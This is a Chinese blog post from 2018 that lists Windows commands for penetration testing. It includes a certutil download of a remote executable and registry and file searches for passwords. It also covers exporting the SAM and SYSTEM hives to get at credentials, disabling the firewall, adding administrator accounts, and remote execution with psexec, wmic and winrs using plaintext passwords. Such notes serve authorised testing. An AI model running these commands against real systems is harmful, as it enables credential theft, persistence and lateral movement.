Title: Windows环境渗透测试常用的命令总结
Date: 2018-06-07 01:10
Modified: 2018-06-07 01:10
Category: 安全
Tags: Windows
Slug: P9
Authors: nJcx
Summary: Windows环境渗透测试常用的命令总结~

#### 介绍

由于长期工作在Linux环境下，企业内网也基本是Linux的，对Windows有点生疏，所以决定记录总结一下Windows的相关常用命令，多面发展


```bash

https://blog.csdn.net/mfkpie/article/details/48005847
https://blog.csdn.net/qq_45174221/article/details/104979705
http://t3ngyu.leanote.com/post/LM-WinRM-WinRS
https://blog.csdn.net/qq_20307987/article/details/85087960

```

```bash

certutil-----从远程url下载文件
案例:certutil -urlcache  -split  -f http://baidu.com/test.exe

findstr-----查找文件后缀结果
findstr /s /i "pass" *.py*

reg query HKLM /f password /t REG_SZ /s-----搜集注册表中的各种密码数据

查看有没有开启远程链接，运行下面命令：
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
结果：1表示关闭，0表示开启

快速查找未打补丁的exp
systeminfo>bzhack.txt&(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type bzhack.txt|@find /i "%i"|| @echo %i you can exp)&del /f /q /a bzhack.txt



md 	   建文件夹
rd 	   删除文件夹
tree 	显示文件夹结构
dir 	显示磁盘目录内容
copy 	复制文件
Xcopy 	copy加强版，复制文件夹
del 	删除文件
ren 	[原文件/夹名][新文件/夹名]修改文件名
type 	查看文本内容
dir /a /s /b d:\"*.conf"		搜索d盘里conf结尾的文件
edit 		文本编辑
type 		显示文件内容

hostname                 查看机器名  
cls                      清屏
net start                查看开启的服务，比如Terminal Services 远程连接服务
net stop sharedaccess    关闭防火墙
set                      查看当前机器的环境变量,看有没有我们可以直接利用到的语言环境
fsutil fsinfo drives     列出当前机器上的所有盘符

ifconfig /all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名
net time /domain 查看域名、时间
net view /domain 查看域内所有共享
net view ip 查看对方局域网内开启了哪些共享
net config workstation 查看域名、机器名等
net user 用户名 密码 /add 建立用户
net user 用户名 /del #删除用户
net user guest /active:yes 激活guest账户
net user 查看账户
net user 账户名 查看指定账户信息
net user /domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。
net user 用户名 /domain 查看账户信息
net group /domain 查看域中的组
net group "domain admins" /domain 查看当前域的管理用户
query user 查看当前在线的用户
net localgroup 查看所有的本地组
net localgroup administrators 查看administrators组中有哪些用户
net localgroup administrators 用户名 /add 把用户添加到管理员组中
net start 查看开启服务
net start 服务名 开启某服务
net stop 服务名 停止某服务
net share 查看本地开启的共享
net share ipc$ 开启ipc$共享
net share ipc$ /del 删除ipc$共享
net share c$ /del 删除C：共享
dsquery server 查看所有域控制器
dsquery subnet 查看域内内子网
dsquery group 查看域内工作组
dsquery site 查看域内站点
netstat -a 查看开启了哪些端口,常用netstat -an
netstat -n 查看端口的网络连接情况，常用netstat -an
netstat -v 查看正在进行的工作
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）
netstat -s 查看正在使用的所有协议使用情况
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写
reg save hklm\sam sam.hive 导出用户组信息、权限配置
reg save hklm\system system.hive 导出SYSKEY
net use \\目标IP\ipc$ 密码 /u:用户名 连接目标机器
at \\目标IP 21:31 c:\server.exe 在某个时间启动某个应用
wmic /node:"目标IP" /password:"123456" /user:"admin" 连接目标机器
psexec.exe \\目标IP -u username -p password -s cmd 在目标机器上执行cmd
finger username @host 查看最近有哪些用户登陆
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。
arp -a 将显示出全部信息
nslookup IP地址侦测器
tasklist 查看当前进程
taskkill /pid PID数 终止指定PID进程
whoami 查看当前用户及权限
systeminfo 查看计算机信息（版本，位数，补丁情况）
ver 查看计算机操作系统版本
tasklist /svc 查看当前计算机进程情况
netstat -ano 查看当前计算机进程情况

wmic product > ins.txt 查看安装软件以及版本路径等信息，重定向到ins.txt
wmic bios ----- 查看bios信息
wmic qfe ----- 查看补丁信息
wmic qfe get hotfixid ----- 查看补丁-Patch号
wmic startup ----- 查看启动项
wmic service ----- 查看服务
wmic os ----- 查看OS信息

wmic process get caption,executablepath,commandline
wmic process call create “process_name” (executes a program)
wmic process where name=”process_name” call terminate (terminates program)
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size,
volumeserialnumber (hard drive information)
wmic useraccount (usernames, sid, and various security related goodies)
wmic useraccount get /ALL
wmic share get /ALL (you can use ? for gets help ! )
wmic startup list full (this can be a huge list!!!)
wmic /node:“hostname” bios get serialnumber (this can be great for finding warranty info about target)


winrs -r:https://myserver.com command
winrs -r:myserver.com -usessl command
winrs -r:myserver command
winrs -r:http://127.0.0.1 command
winrs -r:http://169.51.2.101:80 -unencrypted command
winrs -r:https://[::FFFF:129.144.52.38] command
winrs -r:http://[1080:0:0:0:8:800:200C:417A]:80 command
winrs -r:https://myserver.com -t:600 -u:administrator -p:$%fgh7 ipconfig
winrs -r:myserver -env:PATH=^%PATH^%;c:\tools -env:TEMP=d:\temp config.cmd
winrs -r:myserver netdom join myserver /domain:testdomain /userd:johns /passwordd:$%fgh789
winrs -r:myserver -ad -u:administrator -p:$%fgh7 dir \\anotherserver\share

```



